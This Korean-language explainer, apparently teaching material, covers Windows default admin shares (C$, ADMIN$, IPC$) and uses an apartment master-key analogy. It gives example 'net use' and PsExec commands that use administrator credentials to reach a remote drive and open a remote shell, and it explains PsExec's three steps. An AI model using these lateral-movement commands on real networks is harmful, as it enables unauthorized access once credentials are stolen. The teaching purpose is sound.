#1. SMB 기본 공유란?

"마스터키로 뒷문 열기"

아파트 관리인은 비상시를 위해 모든 세대의 뒷문 열쇠(마스터키)를 갖고 있습니다. Windows도 마찬가지로 관리 목적으로 기본 공유 폴더(C$, ADMIN$, IPC$)를 자동 생성합니다. 공격자가 관리자 인증 정보를 얻으면, 이 숨겨진 뒷문으로 모든 PC에 접근합니다.

기본 관리 공유의 종류

C$
C 드라이브 전체 접근
관리자 전용
ADMIN$
Windows 시스템 폴더
%SystemRoot%
IPC$
프로세스 간 통신
Named Pipes

#2. PsExec & 공격 기법

net use 연결

C:\> net use \\192.168.1.10\C$ /user:DOMAIN\admin P@ssw0rd
명령이 성공적으로 완료되었습니다.
# 이제 대상 PC의 C 드라이브 전체 접근 가능

PsExec 원격 실행

C:\> PsExec.exe \\192.168.1.10 -u admin -p P@ss cmd.exe
Microsoft Windows [Version 10.0.19045]
# ADMIN$ 공유를 통해 서비스 등록 후 원격 명령 실행

PsExec 동작 원리

Step 1 ADMIN$ 공유에 PSEXESVC.exe 서비스 파일 복사
Step 2 SCManager로 원격 서비스 등록 및 시작
Step 3 Named Pipe(IPC$)를 통해 입출력 리다이렉트
